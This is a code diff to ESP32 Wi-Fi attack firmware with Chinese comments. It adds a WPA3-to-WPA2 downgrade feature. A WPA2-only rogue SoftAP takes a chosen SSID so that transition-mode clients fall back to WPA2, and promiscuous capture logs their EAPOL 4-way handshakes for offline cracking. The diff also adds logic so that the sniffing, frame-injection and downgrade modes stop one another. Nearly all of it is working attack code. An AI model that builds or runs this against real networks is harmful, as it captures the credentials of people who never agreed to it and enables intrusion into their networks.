@@ -17,6 +17,7 @@
 #include "radio_common.h"
 #include "rgb_led.h"
 #include "wifi_db.h"
+#include "http_server.h"
 
 #include <stdatomic.h>
 #include <string.h>
@@ -50,10 +51,13 @@ static void raw_out(const char *fmt, ...)
     if (n > 0) {
         if (n > (int)sizeof(buf)) n = sizeof(buf);
         for (int i = 0; i < n; i++) {
-            esp_rom_uart_tx_one_char(buf[i]);
+            esp_rom_output_tx_one_char(buf[i]);
         }
     }
 }
+
+/* Forward decl: sniff_stop_common is defined later, used by stop_all */
+static void sniff_stop_common(void);
 
 /* ===================== 模块状态 ===================== */
 static _Atomic wifi_atk_state_t s_state = WIFI_ATK_IDLE;
@@ -149,8 +153,9 @@ static int extract_ssid(const uint8_t *frame, int len, char *dst, int dst_cap)
 
 static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 {
-    /* state != SNIFF 表示已在停止中或已停, 直接丢弃后续包 */
-    if (atomic_load(&s_state) != WIFI_ATK_SNIFF) return;
+    /* state != SNIFF/DOWNGRADE 表示已停止, 丢弃后续包 */
+    wifi_atk_state_t st = atomic_load(&s_state);
+    if (st != WIFI_ATK_SNIFF && st != WIFI_ATK_DOWNGRADE) return;
     if (!buf || type == WIFI_PKT_MISC) return;
 
     const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
@@ -166,6 +171,22 @@ static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     uint8_t fsub  = frame_subtype(f);
     int8_t  rssi  = (int8_t)p->rx_ctrl.rssi;
 
+    /* === DOWNGRADE 模式: 只抓 EAPOL 4-way, 不打 PKT 行 (避免刷屏) === */
+    if (st == WIFI_ATK_DOWNGRADE) {
+        if (ftype == FC_TYPE_DATA) {
+            wifi_db_update_client(f, frame_len, rssi);
+            if (wifi_db_check_eapol(f, frame_len, rssi)) {
+                char esrc[18], edst[18];
+                mac_to_str(f + 10, esrc);
+                mac_to_str(f + 4, edst);
+                raw_out("META,WIFI,EAPOL,DETECTED,src,%s,dst,%s\n", esrc, edst);
+                rgb_led_pulse(80, 80, 80, 0);
+            }
+        }
+        return;
+    }
+
+    /* === SNIFF 模式: 正常打 PKT/HEX 行 === */
     char da[18], sa[18], bssid[18];
     mac_to_str(f + 4,  da);
     mac_to_str(f + 10, sa);
@@ -286,6 +307,53 @@ static void inject_task(void *pv)
 
 /* ===================== 公共 API ===================== */
 
+/* 停止所有正在运行的功能 (sniff + inject + downgrade).
+ * 任何 _start 函数内部都会先调用此函数实现"启动一个就停其他".
+ * 安全可重复调用, 返回 ESP_OK 表示至少停了一个功能. */
+esp_err_t wifi_attack_stop_all(void)
+{
+    wifi_atk_state_t st = atomic_load(&s_state);
+    bool stopped_any = false;
+
+    /* 1. 停 downgrade AP (如果是) - 关 promiscuous + SoftAP + HTTP */
+    if (st == WIFI_ATK_DOWNGRADE) {
+        if (atomic_load(&s_channel_rotate)) {
+            atomic_store(&s_channel_rotate, false);
+        }
+        esp_wifi_set_promiscuous(false);
+        http_server_stop();   /* 关 SoftAP + HTTP, 切回 STA */
+        atomic_store(&s_state, WIFI_ATK_IDLE);
+        stopped_any = true;
+    }
+
+    /* 2. 停 sniff (无论是否在 sniff, 都尝试关 promiscuous) */
+    if (st == WIFI_ATK_SNIFF) {
+        sniff_stop_common();
+        atomic_store(&s_state, WIFI_ATK_IDLE);
+        stopped_any = true;
+    } else {
+        /* Defensive: 强制关 promiscuous (防止 race) */
+        if (atomic_load(&s_channel_rotate)) {
+            atomic_store(&s_channel_rotate, false);
+        }
+        esp_wifi_set_promiscuous(false);
+    }
+
+    /* 3. 停 inject (设置 flag, 等 task 退出) */
+    if (st == WIFI_ATK_INJECT) {
+        atomic_store(&s_inject_stop, true);
+        for (int i = 0; i < 300 && s_inject_task; i++) {
+            vTaskDelay(pdMS_TO_TICKS(10));
+        }
+        stopped_any = true;
+    }
+
+    if (stopped_any) {
+        rgb_led_set_status(RGB_IDLE);
+    }
+    return stopped_any ? ESP_OK : ESP_ERR_INVALID_STATE;
+}
+
 esp_err_t wifi_attack_init(void)
 {
     if (!s_inject_mtx) {
@@ -323,6 +391,8 @@ esp_err_t wifi_attack_init(void)
 
 esp_err_t wifi_attack_sniff_start(uint8_t channel, uint32_t count)
 {
+    /* 互斥: 自动停其他功能 (inject / downgrade) */
+    wifi_attack_stop_all();
     if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
         return ESP_ERR_INVALID_STATE;
     }
@@ -354,6 +424,8 @@ esp_err_t wifi_attack_sniff_start(uint8_t channel, uint32_t count)
 
 static esp_err_t inject_start_common(inject_args_t *a)
 {
+    /* 互斥: 自动停其他功能 (sniff / downgrade) */
+    wifi_attack_stop_all();
     if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
         free(a);
         return ESP_ERR_INVALID_STATE;
@@ -437,6 +509,8 @@ esp_err_t wifi_attack_inject_stop(void)
 
 esp_err_t wifi_attack_sniff_auto_start(uint32_t dwell_ms)
 {
+    /* 互斥: 自动停其他功能 (inject / downgrade) */
+    wifi_attack_stop_all();
     if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
         return ESP_ERR_INVALID_STATE;
     }
@@ -505,8 +579,9 @@ esp_err_t wifi_attack_sniff_stop(void)
 void wifi_attack_status(void)
 {
     wifi_atk_state_t st = atomic_load(&s_state);
-    const char *stname = (st == WIFI_ATK_SNIFF)  ? "SNIFF"  :
-                         (st == WIFI_ATK_INJECT) ? "INJECT" : "IDLE";
+    const char *stname = (st == WIFI_ATK_SNIFF)      ? "SNIFF"     :
+                         (st == WIFI_ATK_INJECT)     ? "INJECT"    :
+                         (st == WIFI_ATK_DOWNGRADE)  ? "DOWNGRADE" : "IDLE";
     bool auto_ch = atomic_load(&s_channel_rotate);
     printf("META,WIFI,STATUS,state,%s,channel,%u,auto_ch,%u,sniff_total,%u,inject_total,%u,aps,%u,clients,%u,eapols,%u\n",
            stname,
@@ -518,6 +593,62 @@ void wifi_attack_status(void)
            (unsigned)wifi_db_client_count(),
            (unsigned)wifi_db_eapol_count());
     fflush(stdout);
+}
+
+
+/* ===================== WPA3 -> WPA2 Downgrade AP ===================== */
+
+esp_err_t wifi_attack_downgrade_start(const char *ssid, const char *pass)
+{
+    if (!ssid || !*ssid) return ESP_ERR_INVALID_ARG;
+
+    /* 互斥: 停其他功能 (sniff / inject) */
+    wifi_attack_stop_all();
+    if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
+        return ESP_ERR_INVALID_STATE;
+    }
+
+    /* 启动 SoftAP (WPA2-PSK only).
+     * ESP32-C5 SoftAP 不支持 WPA3-SAE, 天然是 WPA2-only AP.
+     * WPA3-Transition 客户端看到 SSID 后会尝试 WPA3-SAE, 失败后降级走 WPA2-PSK
+     * 4-way handshake, 我们抓 EAPOL 存 wifi_db. */
+    esp_err_t e = http_server_start(ssid, pass);
+    if (e != ESP_OK) return e;
+
+    /* 开 promiscuous 抓 EAPOL 4-way handshake (仅 DATA 帧, 减少噪声) */
+    wifi_promiscuous_filter_t filt = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA,
+    };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
+    esp_wifi_set_promiscuous(true);
+
+    atomic_store(&s_state, WIFI_ATK_DOWNGRADE);
+    rgb_led_set_status(RGB_SNIFF_AUTO);   /* 复用 auto 状态, 后续可加专用状态 */
+
+    printf("META,WIFI,DOWNGRADE,START,ssid,%s\n", ssid);
+    fflush(stdout);
+    return ESP_OK;
+}
+
+esp_err_t wifi_attack_downgrade_stop(void)
+{
+    if (atomic_load(&s_state) != WIFI_ATK_DOWNGRADE) {
+        return ESP_ERR_INVALID_STATE;
+    }
+
+    /* 关 promiscuous */
+    esp_wifi_set_promiscuous(false);
+
+    /* 关 SoftAP + HTTP server, 切回 STA */
+    http_server_stop();
+
+    atomic_store(&s_state, WIFI_ATK_IDLE);
+    rgb_led_set_status(RGB_IDLE);
+
+    printf("META,WIFI,DOWNGRADE,STOP,ok,1\n");
+    fflush(stdout);
+    return ESP_OK;
 }
 
 
